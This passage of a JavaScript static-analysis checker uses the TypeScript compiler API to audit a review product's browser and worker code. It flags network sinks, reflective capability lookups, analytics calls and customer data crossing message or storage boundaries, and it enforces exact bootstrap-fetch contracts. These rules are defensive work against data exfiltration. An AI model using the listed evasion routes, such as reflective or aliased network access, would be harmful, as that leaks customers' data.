      && ts.isIdentifier(call.arguments[1])
      && call.arguments[1].text === "name";
  }

  function enclosingCallable(node) {
    let current = node.parent;
    while (current) {
      if (ts.isFunctionLike(current)) return current;
      current = current.parent;
    }
    return null;
  }

  function reviewedFindingsClientPostMessage(node) {
    if (
      relativeName !== "lib/findings-sync-client.ts"
      || !ts.isCallExpression(node)
      || node.expression.getText(parsed) !== "worker.postMessage"
      || node.arguments.length !== 2
      || !ts.isIdentifier(node.arguments[0])
      || node.arguments[0].text !== "message"
      || !ts.isArrayLiteralExpression(node.arguments[1])
      || node.arguments[1].elements.length !== 1
      || node.arguments[1].elements[0].getText(parsed) !== "namespaceBuffer"
    ) return false;
    const callable = enclosingCallable(node);
    if (!callable || !ts.isMethodDeclaration(callable) || callable.name.getText(parsed) !== "#begin") {
      return false;
    }
    const messageObjects = [];
    function inspect(current) {
      if (
        ts.isVariableDeclaration(current)
        && ts.isIdentifier(current.name)
        && current.name.text === "message"
        && ts.isObjectLiteralExpression(current.initializer)
      ) messageObjects.push(current.initializer);
      ts.forEachChild(current, inspect);
    }
    inspect(callable);
    if (messageObjects.length !== 1 || messageObjects[0].properties.length !== 6) return false;
    const messageObject = messageObjects[0];
    const expected = new Map([
      ["type", '"project_findings"'],
      ["protocol_version", "WORKER_PROTOCOL_VERSION"],
      ["request_id", "requestId"],
      ["review_json", "pending.reviewJson"],
      ["project_ref", "pending.projectRef"],
      ["namespace_key", "namespaceBuffer"],
    ]);
    for (const property of messageObject.properties) {
      if (!ts.isPropertyAssignment(property)) return false;
      const name = ts.isIdentifier(property.name) || ts.isStringLiteralLike(property.name)
        ? property.name.text
        : null;
      if (name === null || property.initializer.getText(parsed) !== expected.get(name)) return false;
      expected.delete(name);
    }
    return expected.size === 0;
  }

  function reviewedWorkerPostMessage(node) {
    return relativeName === "workers/heel-review.worker.ts"
      && ts.isCallExpression(node)
      && node.expression.getText(parsed) === "scope.postMessage"
      && node.arguments.length === 1
      && node.arguments[0].getText(parsed) === "JSON.stringify(value)"
      && enclosingFunctionName(node) === "send";
  }

  function isReflectiveRootReference(node) {
    if (!isRuntimeIdentifierReference(node)) return false;
    if (node.text === "Reflect") return true;
    return node.text === "Object" && !allowedObjectReference(node);
  }

  function reflectiveMethodAuthority(node) {
    const root = rootName(node);
    const name = memberName(node);
    if (
      root === "Reflect"
      && ["apply", "construct", "get", "getOwnPropertyDescriptor"].includes(name ?? "")
    ) return name;
    if (
      root === "Object"
      && ["getOwnPropertyDescriptor", "getOwnPropertyDescriptors"].includes(name ?? "")
    ) return name;
    if (["__lookupGetter__", "__lookupSetter__"].includes(name ?? "")) return name;
    if (ambientRoots.has(root ?? "") && ["Object", "Reflect"].includes(name ?? "")) return name;
    return null;
  }

  function initializerDeclaration(node) {
    let current = node.parent;
    while (
      ts.isAsExpression(current)
      || ts.isTypeAssertionExpression(current)
      || ts.isParenthesizedExpression(current)
      || ts.isNonNullExpression(current)
      || ts.isSatisfiesExpression(current)
    ) current = current.parent;
    return ts.isVariableDeclaration(current) ? current : null;
  }

  function isReviewedWorkerScopeDeclaration(node) {
    const declaration = initializerDeclaration(node);
    return engineWorker
      && declaration !== null
      && ts.isIdentifier(declaration.name)
      && declaration.name.text === "scope"
      && declaration.initializer?.getText(parsed) === "globalThis as unknown as DedicatedWorkerGlobalScope";
  }

  function allowedAmbientRootReference(node) {
    if (relativeName === "app/dashboard/page.tsx" && node.text === "document"
      && ts.isPropertyAccessExpression(node.parent) && node.parent.expression === node
      && ["visibilityState", "addEventListener", "removeEventListener"].includes(node.parent.name.text)) return true;
    if (
      ((["lib/local-reviews.ts", "lib/findings-sync-queue.ts"].includes(relativeName)
          && memberName(node.parent) === "indexedDB")
        || (relativeName === "lib/findings-sync-queue.ts"
          && memberName(node.parent) === "IDBKeyRange"))
      && node.text === "globalThis"
      && (ts.isPropertyAccessExpression(node.parent) || ts.isElementAccessExpression(node.parent))
      && node.parent.expression === node
    ) return true;
    return node.text === "globalThis" && isReviewedWorkerScopeDeclaration(node);
  }

  function isBootstrapBindScopeArgument(node) {
    const call = node.parent;
    if (!ts.isCallExpression(call) || !call.arguments.includes(node)) return false;
    const bind = call.expression;
    return ts.isPropertyAccessExpression(bind)
      && bind.name.text === "bind"
      && (ts.isPropertyAccessExpression(bind.expression) || ts.isElementAccessExpression(bind.expression))
      && allowedFetchReference(bind.expression);
  }

  function isGuardScopeAlias(node) {
    const declaration = initializerDeclaration(node);
    return declaration !== null
      && ts.isIdentifier(declaration.name)
      && declaration.name.text === "ambient"
      && declaration.initializer?.getText(parsed) === "scope as unknown as Record<string, unknown>"
      && enclosingFunctionName(declaration) === "guardAmbientNetwork";
  }

  function allowedWorkerScopeReference(node) {
    if (node.text === "ambient") {
      const call = node.parent;
      return ts.isCallExpression(call)
        && call.expression.getText(parsed) === "guardProperty"
        && call.arguments[0] === node
        && call.arguments.length >= 2
        && ts.isIdentifier(call.arguments[1])
        && call.arguments[1].text === "name"
        && enclosingFunctionName(call) === "guardAmbientNetwork";
    }
    if (isBootstrapBindScopeArgument(node) || isGuardScopeAlias(node)) return true;
    const member = node.parent;
    if (
      !(ts.isPropertyAccessExpression(member) || ts.isElementAccessExpression(member))
      || member.expression !== node
    ) return false;
    const name = memberName(member);
    if (name === "fetch") return allowedFetchReference(member);
    if (name === "location") return enclosingFunctionName(member) === "fetchLocal";
    if (name === "postMessage") {
      return ts.isCallExpression(member.parent)
        && member.parent.expression === member
        && enclosingFunctionName(member.parent) === "send";
    }
    if (name === "onmessage") {
      return ts.isBinaryExpression(member.parent)
        && member.parent.left === member
        && member.parent.operatorToken.kind === ts.SyntaxKind.EqualsToken;
    }
    return false;
  }

  function allowedBootstrapFetchReference(node) {
    const parent = node.parent;
    if (
      ts.isVariableDeclaration(parent)
      && parent.initializer === node
      && isReviewedFetcherDeclaration(parent)
    ) return true;
    return ts.isBinaryExpression(parent)
      && parent.left === node
      && parent.operatorToken.kind === ts.SyntaxKind.EqualsToken
      && parent.right.kind === ts.SyntaxKind.NullKeyword
      && enclosingFunctionName(parent) === "boot";
  }

  function allowedFetcherReference(node) {
    const parent = node.parent;
    if (ts.isCallExpression(parent) && parent.expression === node) {
      return isReviewedFetcherCall(parent);
    }
    if (
      ts.isBinaryExpression(parent)
      && parent.operatorToken.kind === ts.SyntaxKind.EqualsEqualsEqualsToken
      && enclosingFunctionName(parent) === "fetchLocal"
    ) {
      const other = parent.left === node ? parent.right : parent.left;
      return other.kind === ts.SyntaxKind.NullKeyword;
    }
    return false;
  }

  function allowedFetchLocalReference(node) {
    const call = node.parent;
    if (
      !ts.isCallExpression(call)
      || call.expression !== node
      || call.questionDotToken
      || call.arguments.length !== 1
      || enclosingFunctionName(call) !== "boot"
    ) return false;
    const argument = call.arguments[0];
    return ts.isIdentifier(argument)
      && reviewedRuntimeUrlDeclaration(argument.text);
  }

  function bindingDeclaresName(name, target) {
    if (ts.isIdentifier(name)) return name.text === target;
    if (ts.isObjectBindingPattern(name) || ts.isArrayBindingPattern(name)) {
      return name.elements.some((element) => (
        ts.isBindingElement(element) && bindingDeclaresName(element.name, target)
      ));
    }
    return false;
  }

  function lexicalBindings(name) {
    const bindings = [];
    function inspect(current) {
      if (
        (ts.isVariableDeclaration(current) || ts.isParameter(current))
        && bindingDeclaresName(current.name, name)
      ) bindings.push(current);
      if (
        (ts.isFunctionDeclaration(current) || ts.isClassDeclaration(current))
        && current.name?.text === name
      ) bindings.push(current);
      if (
        (ts.isImportClause(current) || ts.isImportSpecifier(current) || ts.isNamespaceImport(current))
        && current.name?.text === name
      ) bindings.push(current);
      ts.forEachChild(current, inspect);
    }
    inspect(parsed);
    return bindings;
  }

  function reviewedRuntimeUrlDeclaration(name) {
    if (!["RUNTIME_MANIFEST_URL", "WHEEL_URL"].includes(name)) return false;
    return reviewedRuntimeConstantDeclaration(name);
  }

  function reviewedRuntimeConstantDeclaration(name) {
    const expected = new Map([
      ["RUNTIME_ROOT", `"/heel-runtime/"`],
      ["RUNTIME_MODULE_URL", `"/heel-runtime/pyodide.mjs"`],
      ["RUNTIME_MANIFEST_URL", `"/heel-runtime/runtime-manifest.json"`],
      ["WHEEL_URL", "`${RUNTIME_ROOT}${WHEEL_FILENAME}`"],
    ]);
    if (!expected.has(name)) return false;
    const declarations = lexicalBindings(name);
    if (declarations.length !== 1 || !ts.isVariableDeclaration(declarations[0])) return false;
    const declaration = declarations[0];
    const statement = declaration.parent.parent;
    if (
      !ts.isVariableDeclarationList(declaration.parent)
      || (declaration.parent.flags & ts.NodeFlags.Const) === 0
      || !ts.isVariableStatement(statement)
      || statement.parent !== parsed
    ) return false;
    return declaration.initializer?.getText(parsed) === expected.get(name);
  }

  function topLevelVariable(declaration, kind, type, initializer) {
    return ts.isVariableDeclaration(declaration)
      && ts.isIdentifier(declaration.name)
      && ts.isVariableDeclarationList(declaration.parent)
      && (declaration.parent.flags & kind) !== 0
      && ts.isVariableStatement(declaration.parent.parent)
      && declaration.parent.parent.parent === parsed
      && (type === null ? declaration.type === undefined : declaration.type?.getText(parsed) === type)
      && declaration.initializer?.getText(parsed) === initializer;
  }

  function parameterMatches(parameter, name, type) {
    return ts.isIdentifier(parameter.name)
      && parameter.name.text === name
      && parameter.type?.getText(parsed) === type
      && parameter.initializer === undefined
      && parameter.dotDotDotToken === undefined;
  }

  function reviewedFunction(declaration, name, parameters, returnType, asynchronous = false) {
    return ts.isFunctionDeclaration(declaration)
      && declaration.name?.text === name
      && declaration.parent === parsed
      && declaration.body !== undefined
      && declaration.parameters.length === parameters.length
      && declaration.parameters.every((parameter, index) => (
        parameterMatches(parameter, parameters[index][0], parameters[index][1])
      ))
      && declaration.type?.getText(parsed) === returnType
      && Boolean(declaration.modifiers?.some((modifier) => modifier.kind === ts.SyntaxKind.AsyncKeyword)) === asynchronous;
  }

  function reviewedCriticalBinding(name, declaration) {
    if (["RUNTIME_ROOT", "RUNTIME_MODULE_URL", "RUNTIME_MANIFEST_URL", "WHEEL_URL"].includes(name)) {
      return reviewedRuntimeConstantDeclaration(name) && lexicalBindings(name)[0] === declaration;
    }
    if (name === "scope") {
      return topLevelVariable(
        declaration,
        ts.NodeFlags.Const,
        null,
        "globalThis as unknown as DedicatedWorkerGlobalScope",
      );
    }
    if (name === "bootstrapFetch") {
      return isReviewedBootstrapDeclaration(declaration)
        && ts.isVariableStatement(declaration.parent.parent)
        && declaration.parent.parent.parent === parsed;
    }
    if (name === "reviewEntry") {
      return topLevelVariable(declaration, ts.NodeFlags.Let, "PyodideCallable | null", "null");
    }
    if (name === "findingsEntry") {
      return topLevelVariable(declaration, ts.NodeFlags.Let, "PyodideCallable | null", "null");
    }
    if (name === "acceptingInput") {
      return topLevelVariable(declaration, ts.NodeFlags.Let, null, "false");
    }
    if (name === "fetcher") return isReviewedFetcherDeclaration(declaration);
    if (name === "fetchLocal") {
      return reviewedFunction(declaration, name, [["path", "string"]], "Promise<Response>", true);
    }
    if (name === "boot") return reviewedFunction(declaration, name, [], "Promise<void>", true);
    if (name === "guardAmbientNetwork") return reviewedFunction(declaration, name, [], "void");
    if (name === "guardDynamicPackages") {
      return reviewedFunction(declaration, name, [["pyodide", "HeelPyodideRuntime"]], "void");
    }
    if (name === "guardProperty") {
      return reviewedFunction(
        declaration,
        name,
        [["owner", "Record<string, unknown>"], ["name", "string"]],
        "void",
      );
    }
    if (name === "send") {
      return reviewedFunction(declaration, name, [["value", "Record<string, unknown>"]], "void");
    }
    return false;
  }

  function validateCriticalWorkerBindings() {
    const names = [
      "RUNTIME_ROOT", "RUNTIME_MODULE_URL", "RUNTIME_MANIFEST_URL", "WHEEL_URL",
      "acceptingInput", "boot", "bootstrapFetch", "fetchLocal", "fetcher",
      "findingsEntry", "guardAmbientNetwork", "guardDynamicPackages", "guardProperty",
      "reviewEntry", "scope", "send",
    ];
    for (const name of names) {
      const bindings = lexicalBindings(name);
      if (bindings.length !== 1 || !reviewedCriticalBinding(name, bindings[0])) {
        report(bindings[1] ?? bindings[0] ?? parsed, `critical worker binding ${name} is not unique and exact`);
      }
    }
  }

  function validateFindingsProjectionContract() {
    if (!parsed.getFullText().includes('type: "project_findings"')) return;
    const contract = [
      "function projectFindings(request: FindingsRequest): void {",
      "const namespaceKey = new Uint8Array(request.namespace_key);",
      "let ownsOperation = false;\n  try {\n    if (reviewing) {",
      "reviewing = true;\n    ownsOperation = true;",
      "namespaceKey.fill(0);",
      "if (ownsOperation) reviewing = false;",
      "new Uint8Array(event.data.namespace_key).fill(0);",
    ];
    const sourceText = parsed.getFullText();
    for (const fragment of contract) {
      if (sourceText.split(fragment).length - 1 !== 1) {
        report(parsed, `findings worker contract is missing exact ${fragment}`);
      }
    }
    const resultSends = [];
    function inspect(current) {
      if (sendMessageType(current) === "findings_result") resultSends.push(current);
      ts.forEachChild(current, inspect);
    }
    inspect(parsed);
    const result = resultSends[0];
    const expected = new Map([
      ["type", '"findings_result"'],
      ["protocol_version", "WORKER_PROTOCOL_VERSION"],
      ["request_id", "request.request_id"],
      ["request_json", "requestJson"],
    ]);
    let exactResult = resultSends.length === 1
      && ts.isCallExpression(result)
      && ts.isObjectLiteralExpression(result.arguments[0])
      && result.arguments[0].properties.length === expected.size;
    if (exactResult) {
      for (const property of result.arguments[0].properties) {
        const name = ts.isPropertyAssignment(property)
          && (ts.isIdentifier(property.name) || ts.isStringLiteralLike(property.name))
          ? property.name.text
          : null;
        if (name === null || property.initializer.getText(parsed) !== expected.get(name)) {
          exactResult = false;
          break;
        }
        expected.delete(name);
      }
    }
    if (!exactResult || expected.size !== 0) {
      report(result ?? parsed, "findings worker result disclosure is not exact");
    }
  }

  function allowedBootReference(node) {
    const call = node.parent;
    if (
      !ts.isCallExpression(call)
      || call.expression !== node
      || call.questionDotToken
      || call.arguments.length !== 0
      || !ts.isVoidExpression(call.parent)
      || !ts.isExpressionStatement(call.parent.parent)
      || call.parent.parent.parent !== parsed
    ) return false;
    const statement = call.parent.parent;
    return parsed.statements.at(-1) === statement;
  }

  function isDynamicImportCall(node) {
    return ts.isCallExpression(node) && node.expression.kind === ts.SyntaxKind.ImportKeyword;
  }

  function allowedDynamicImport(node) {
    return engineWorker
      && isDynamicImportCall(node)
      && node.arguments.length === 1
      && ts.isIdentifier(node.arguments[0])
      && node.arguments[0].text === "RUNTIME_MODULE_URL"
      && reviewedRuntimeConstantDeclaration("RUNTIME_MODULE_URL")
      && enclosingFunctionName(node) === "boot"
      && ts.isAwaitExpression(node.parent)
      && node.getText(parsed) === "import(/* @vite-ignore */ RUNTIME_MODULE_URL)";
  }

  function validateDynamicImportContract() {
    const imports = [];
    function inspect(current) {
      if (isDynamicImportCall(current)) imports.push(current);
      ts.forEachChild(current, inspect);
    }
    inspect(parsed);
    if (imports.length !== 1 || !allowedDynamicImport(imports[0])) {
      report(imports[1] ?? imports[0] ?? parsed, "dynamic import authority contract is not exact");
    }
  }

  function exactBootstrapRevocation(statement) {
    if (!ts.isExpressionStatement(statement) || !ts.isBinaryExpression(statement.expression)) return false;
    const expression = statement.expression;
    return expression.operatorToken.kind === ts.SyntaxKind.EqualsToken
      && ts.isIdentifier(expression.left)
      && expression.left.text === "bootstrapFetch"
      && expression.right.kind === ts.SyntaxKind.NullKeyword;
  }

  function exactBooleanAssignment(statement, name, value) {
    if (!ts.isExpressionStatement(statement) || !ts.isBinaryExpression(statement.expression)) return false;
    const expression = statement.expression;
    return expression.operatorToken.kind === ts.SyntaxKind.EqualsToken
      && ts.isIdentifier(expression.left)
      && expression.left.text === name
      && expression.right.kind === (value ? ts.SyntaxKind.TrueKeyword : ts.SyntaxKind.FalseKeyword);
  }

  function booleanAssignmentValue(node, name) {
    if (
      !ts.isBinaryExpression(node)
      || !ts.isAssignmentOperator(node.operatorToken.kind)
    ) return null;
    let targetsName = false;
    function inspectTarget(current) {
      if (ts.isIdentifier(current) && current.text === name) targetsName = true;
      else if (!targetsName) ts.forEachChild(current, inspectTarget);
    }
    inspectTarget(node.left);
    if (!targetsName) return null;
    if (
      node.operatorToken.kind === ts.SyntaxKind.EqualsToken
      && ts.isIdentifier(node.left)
      && node.left.text === name
    ) {
      if (node.right.kind === ts.SyntaxKind.TrueKeyword) return true;
      if (node.right.kind === ts.SyntaxKind.FalseKeyword) return false;
    }
    return "other";
  }

  function directCallStatement(statement, name) {
    return ts.isExpressionStatement(statement)
      && ts.isCallExpression(statement.expression)
      && !statement.expression.questionDotToken
      && ts.isIdentifier(statement.expression.expression)
      && statement.expression.expression.text === name;
  }

  function sendMessageType(node) {
    if (
      !ts.isCallExpression(node)
      || node.questionDotToken
      || !ts.isIdentifier(node.expression)
      || node.expression.text !== "send"
      || node.arguments.length !== 1
      || !ts.isObjectLiteralExpression(node.arguments[0])
    ) return null;
    const typeProperty = node.arguments[0].properties.find((property) => (
      ts.isPropertyAssignment(property)
      && (ts.isIdentifier(property.name) || ts.isStringLiteralLike(property.name))
      && property.name.text === "type"
    ));
    return typeProperty
      && ts.isPropertyAssignment(typeProperty)
      && ts.isStringLiteralLike(typeProperty.initializer)
      ? typeProperty.initializer.text
      : null;
  }

  function directSendStatement(statement, type) {
    if (
      !ts.isExpressionStatement(statement)
      || sendMessageType(statement.expression) !== type
      || !ts.isCallExpression(statement.expression)
      || !ts.isObjectLiteralExpression(statement.expression.arguments[0])
    ) return false;
    const payload = statement.expression.arguments[0];
    const expected = type === "ready"
      ? new Map([
        ["type", `"ready"`],
        ["protocol_version", "WORKER_PROTOCOL_VERSION"],
      ])
      : new Map([
        ["type", `"fatal"`],
        ["protocol_version", "WORKER_PROTOCOL_VERSION"],
        ["code", `"engine_unavailable"`],
        ["message", "PUBLIC_ERRORS.engine_unavailable"],
      ]);
    if (payload.properties.length !== expected.size) return false;
    for (const property of payload.properties) {
      if (
        !ts.isPropertyAssignment(property)
        || !(ts.isIdentifier(property.name) || ts.isStringLiteralLike(property.name))
        || property.initializer.getText(parsed) !== expected.get(property.name.text)
      ) return false;
    }
    return true;
  }

  function validateBootstrapRevocationContract() {
    const bootFunctions = [];
    const bootstrapDeclarations = [];
    const allRevocations = [];
    const bootReferences = [];
    function inspect(current) {
      if (ts.isFunctionDeclaration(current) && current.name?.text === "boot") {
        bootFunctions.push(current);
      }
      if (
        ts.isVariableDeclaration(current)
        && ts.isIdentifier(current.name)
        && current.name.text === "bootstrapFetch"
      ) bootstrapDeclarations.push(current);
      if (ts.isExpressionStatement(current) && exactBootstrapRevocation(current)) {
        allRevocations.push(current);
      }
      if (
        ts.isIdentifier(current)
        && current.text === "boot"
        && isRuntimeIdentifierReference(current)
      ) bootReferences.push(current);
      ts.forEachChild(current, inspect);
    }
    inspect(parsed);

    const runtimeUrlsValid = ["RUNTIME_MANIFEST_URL", "WHEEL_URL"]
      .every(reviewedRuntimeUrlDeclaration);
    if (!runtimeUrlsValid) report(parsed, "runtime URL constant binding is not unique and exact");

    const boot = bootFunctions[0];
    const exactBootDeclaration = bootFunctions.length === 1
      && boot?.body
      && boot.parameters.length === 0
      && boot.modifiers?.some((modifier) => modifier.kind === ts.SyntaxKind.AsyncKeyword)
      && boot.type?.getText(parsed) === "Promise<void>";
    const bootAuthorityValid = exactBootDeclaration
      && bootReferences.length === 1
      && allowedBootReference(bootReferences[0]);
    if (!bootAuthorityValid) report(boot ?? parsed, "boot authority reference contract is not exact");

    let revocationValid = bootstrapDeclarations.length === 1
      && isReviewedBootstrapDeclaration(bootstrapDeclarations[0])
      && exactBootDeclaration
      && allRevocations.length === 2;
    let readinessValid = exactBootDeclaration;
    const tryStatements = boot?.body?.statements.filter(ts.isTryStatement) ?? [];
    if (
      boot?.body?.statements.length !== 1
      || tryStatements.length !== 1
      || tryStatements[0].finallyBlock
      || !tryStatements[0].catchClause
    ) {
      revocationValid = false;
      readinessValid = false;
    } else {
      const reviewedTry = tryStatements[0];
      const success = [...reviewedTry.tryBlock.statements];
      const failure = [...reviewedTry.catchClause.block.statements];
      const successRevoke = success.findIndex(exactBootstrapRevocation);
      const failureRevoke = failure.findIndex(exactBootstrapRevocation);
      const guardNetwork = success.findIndex((statement) => directCallStatement(statement, "guardAmbientNetwork"));
      const ready = success.findIndex((statement) => exactBooleanAssignment(statement, "acceptingInput", true));
      const readySend = success.findIndex((statement) => directSendStatement(statement, "ready"));
      const failed = failure.findIndex((statement) => exactBooleanAssignment(statement, "acceptingInput", false));
      const fatalSend = failure.findIndex((statement) => directSendStatement(statement, "fatal"));
      const acceptingAssignments = [];
      const readySends = [];
      const abruptExits = [];
      const fetchLocalReferences = [];
      const guardNetworkCalls = [];
      function inspectBoot(current) {
        if (ts.isBinaryExpression(current)) {
          const value = booleanAssignmentValue(current, "acceptingInput");
          if (value !== null) acceptingAssignments.push([current, value]);
        }
        if (ts.isCallExpression(current)) {
          if (sendMessageType(current) === "ready") readySends.push(current);
          if (ts.isIdentifier(current.expression) && current.expression.text === "guardAmbientNetwork") {
            guardNetworkCalls.push(current);
          }
        }
        if (
          ts.isReturnStatement(current)
          || ts.isBreakStatement(current)
          || ts.isContinueStatement(current)
        ) abruptExits.push(current);
        if (
          ts.isIdentifier(current)
          && current.text === "fetchLocal"
          && isRuntimeIdentifierReference(current)
        ) fetchLocalReferences.push(current);
        ts.forEachChild(current, inspectBoot);
      }
      inspectBoot(boot.body);
      const fetchArguments = fetchLocalReferences.map((reference) => (
        ts.isCallExpression(reference.parent)
        && reference.parent.expression === reference
        && reference.parent.arguments.length === 1
        && ts.isIdentifier(reference.parent.arguments[0])
          ? reference.parent.arguments[0].text
          : null
      ));
      revocationValid &&= runtimeUrlsValid
        && success.filter(exactBootstrapRevocation).length === 1
        && failure.filter(exactBootstrapRevocation).length === 1
        && fetchLocalReferences.length === 2
        && fetchLocalReferences.every(allowedFetchLocalReference)
        && fetchArguments.filter((name) => name === "RUNTIME_MANIFEST_URL").length === 1
        && fetchArguments.filter((name) => name === "WHEEL_URL").length === 1
        && guardNetworkCalls.length === 1
        && guardNetwork >= 0
        && successRevoke === guardNetwork + 1
        && failed >= 0
        && failureRevoke === failed + 1
        && fatalSend === failureRevoke + 1;
      readinessValid &&= acceptingAssignments.length === 2
        && acceptingAssignments.filter(([, value]) => value === true).length === 1
        && acceptingAssignments.filter(([, value]) => value === false).length === 1
        && readySends.length === 1
        && abruptExits.length === 0
        && ready === successRevoke + 1
        && readySend === ready + 1;
    }
    if (!revocationValid) report(boot ?? parsed, "bootstrap fetch revocation contract is not exact");
    if (!readinessValid) report(boot ?? parsed, "boot readiness contract is not exact");
  }

  function containsAmbientReference(node) {
    let found = false;
    function inspect(current) {
      if (ts.isIdentifier(current) && ambientRoots.has(current.text)) {
        found = true;
        return;
      }
      if (!found) ts.forEachChild(current, inspect);
    }
    inspect(node);
    return found;
  }

  function networkNameWithin(node) {
    let found = null;
    function inspect(current) {
      for (const value of resolvedConstantStrings(current)) {
        if (networkCapabilities.has(value)) {
          found = value;
          return;
        }
      }
      if (found === null) ts.forEachChild(current, inspect);
    }
    inspect(node);
    return found;
  }

  function reflectiveNetworkLookup(node) {
    const expression = node.expression;
    const root = rootName(expression);
    const name = memberName(expression);
    const text = expression.getText(parsed);
    const reflective = (
      root === "Reflect"
      && ["get", "apply", "construct", "getOwnPropertyDescriptor"].includes(name ?? "")
    ) || (
      root === "Object"
      && ["getOwnPropertyDescriptor", "getOwnPropertyDescriptors"].includes(name ?? "")
    ) || (
      ["__lookupGetter__", "__lookupSetter__"].some((lookup) => text.includes(lookup))
    );
    if (!reflective || !containsAmbientReference(node)) return null;
    const networkName = networkNameWithin(node);
    if (networkName !== null) return networkName;
    return root === "Object" && name === "getOwnPropertyDescriptors" ? "ambient descriptors" : null;
  }

  function visit(node) {
    if (
      ts.isIdentifier(node)
      && isCapabilityIdentifierReference(node)
      && !(
        node.text === "fetch"
        && ts.isCallExpression(node.parent)
        && node.parent.expression === node
        && allowedFetchCall(node.parent)
      )
    ) {
      report(node, `network sink capability reference ${node.text}`);
    }
    if (ts.isIdentifier(node) && isReflectiveRootReference(node)) {
      report(node, `reflective root authority reference ${node.text}`);
    }
    if (
      ts.isIdentifier(node)
      && ambientRoots.has(node.text)
      && isRuntimeIdentifierReference(node)
      && !allowedAmbientRootReference(node)
    ) report(node, `ambient root authority reference ${node.text}`);
    if (
      engineWorker
      && ts.isIdentifier(node)
      && ["ambient", "scope"].includes(node.text)
      && isRuntimeIdentifierReference(node)
      && !allowedWorkerScopeReference(node)
    ) report(node, `worker ambient alias authority reference ${node.text}`);
    if (
      engineWorker
      && ts.isVariableDeclaration(node)
      && ts.isIdentifier(node.name)
      && node.name.text === "bootstrapFetch"
      && !isReviewedBootstrapDeclaration(node)
    ) report(node, "unreviewed bootstrap fetch authority declaration");
    if (
      engineWorker
      && ts.isIdentifier(node)
      && node.text === "bootstrapFetch"
      && isRuntimeIdentifierReference(node)
      && !allowedBootstrapFetchReference(node)
    ) report(node, "bootstrap fetch authority reference bootstrapFetch");
    if (
      engineWorker
      && ts.isIdentifier(node)
      && node.text === "fetcher"
      && isRuntimeIdentifierReference(node)
      && !allowedFetcherReference(node)
    ) report(node, "bootstrap fetch authority reference fetcher");
    if (
      engineWorker
      && ts.isIdentifier(node)
      && node.text === "fetchLocal"
      && isRuntimeIdentifierReference(node)
      && !allowedFetchLocalReference(node)
    ) report(node, "fetchLocal authority reference is not an exact reviewed boot call");
    if (
      engineWorker
      && ts.isIdentifier(node)
      && node.text === "boot"
      && isRuntimeIdentifierReference(node)
      && !allowedBootReference(node)
    ) report(node, "boot authority reference is not the terminal reviewed call");

    if (ts.isVariableDeclaration(node) && node.initializer) {
      if (ts.isIdentifier(node.name)) {
        recordAlias(node.name, node.initializer, node);
      } else if (ts.isObjectBindingPattern(node.name)) {
        for (const element of node.name.elements) {
          const propertyNames = bindingPropertyNames(element);
          for (const propertyName of propertyNames) {
            if (runtimeAuthorityMembers.has(propertyName)) {
              report(element, `runtime Window/document authority carrier ${propertyName}`);
            }
          }
          if (
            ts.isIdentifier(element.name)
            && [...propertyNames].some((propertyName) => networkCapabilities.has(propertyName))
          ) {
            sinkAliases.add(element.name.text);
            report(element, `network sink alias ${element.name.text}`);
          }
        }
      }
    }

    if (
      ts.isBinaryExpression(node)
      && node.operatorToken.kind === ts.SyntaxKind.EqualsToken
    ) recordAlias(node.left, node.right, node);

    if (
      ts.isExpressionStatement(node)
      && ts.isStringLiteral(node.expression)
      && node.expression.text === "use server"
    ) report(node, "server action directive in browser source");

    if (ts.isElementAccessExpression(node) && node.argumentExpression) {
      const root = rootName(node);
      if (ambientRoots.has(root) && constantString(node.argumentExpression) === null) {
        report(node, "dynamic ambient capability access");
      }
    }

    if (ts.isPropertyAccessExpression(node) || ts.isElementAccessExpression(node)) {
      const name = memberName(node);
      const names = resolvedMemberNames(node);
      const root = rootName(node);
      const reflectiveAuthority = reflectiveMethodAuthority(node);
      if (reflectiveAuthority !== null) {
        report(node, `reflective method authority reference ${reflectiveAuthority}`);
      }
      for (const resolvedName of names) {
        if (runtimeAuthorityMembers.has(resolvedName)) {
          report(node, `runtime Window/document authority carrier ${resolvedName}`);
        }
        if (networkCapabilities.has(resolvedName) && !allowedFetchReference(node)) {
          report(node, `network sink capability reference ${resolvedName}`);
        }
      }
      if (["localStorage", "sessionStorage", "caches", "CacheStorage"].includes(name ?? "")) {
        report(node, `durable/cache capability ${name}`);
      }
      if (root === "console") report(node, "console capability in customer boundary");
      if (
        root === "globalThis"
        && ((name === "indexedDB"
            && !["lib/local-reviews.ts", "lib/findings-sync-queue.ts"].includes(relativeName))
          || (name === "IDBKeyRange" && relativeName !== "lib/findings-sync-queue.ts"))
      ) {
        report(node, "IndexedDB capability outside an approved local-only store");
      }
    }

    if (ts.isCallExpression(node) || ts.isNewExpression(node)) {
      const name = memberName(node.expression);
      const names = resolvedMemberNames(node.expression);
      const root = rootName(node.expression);
      const args = [...(node.arguments ?? [])];
      if (ts.isCallExpression(node)) {
        if (isDynamicImportCall(node) && !allowedDynamicImport(node)) {
          report(node, "dynamic import authority is not the reviewed boot import");
        }
        const reflected = reflectiveNetworkLookup(node);
        if (reflected !== null) report(node, `reflective network capability lookup ${reflected}`);
      }
      if (ts.isIdentifier(node.expression) && sinkAliases.has(node.expression.text)) {
        report(node, `network sink alias ${node.expression.text}`);
      }
      if (
        ts.isIdentifier(node.expression)
        && networkCapabilities.has(node.expression.text)
        && !allowedFetchCall(node)
      ) report(node, `network sink ${node.expression.text}`);
      for (const resolvedName of names) {
        if (networkCapabilities.has(resolvedName) && !allowedFetchCall(node)) {
          report(node, `network sink ${resolvedName}`);
        }
      }
      if (name === "fetcher" && !allowedFetchCall(node)) report(node, "unapproved bootstrap fetch alias");
      if (root === "console") report(node, "console sink in customer boundary");
      if (/analytics|telemetry|track|capture/i.test(name ?? "")) report(node, `analytics sink ${name}`);
      if (
        ["URL", "pushState", "replaceState", "setItem", "put", "add"].includes(name ?? "")
        && args.some(containsSensitiveInput)
      ) report(node, `${name} receives customer source or answers`);
      if (name === "postMessage" && args.some(containsSensitiveInput)) {
        const allowed = relativeName === "lib/browser-review-client.ts"
          || reviewedFindingsClientPostMessage(node)
          || reviewedWorkerPostMessage(node);
        if (!allowed) report(node, "customer input crosses an unapproved message boundary");
      }
      if (
        name === "postMessage"
        && relativeName === "lib/findings-sync-client.ts"
        && !reviewedFindingsClientPostMessage(node)
      ) report(node, "findings projection crosses an unapproved message boundary");
      if (
        name === "postMessage"
        && relativeName === "workers/heel-review.worker.ts"
        && !reviewedWorkerPostMessage(node)
      ) report(node, "worker output crosses an unapproved message boundary");
    }
    ts.forEachChild(node, visit);
  }
  visit(parsed);
  if (engineWorker) {
    validateCriticalWorkerBindings();
    validateDynamicImportContract();
    validateBootstrapRevocationContract();
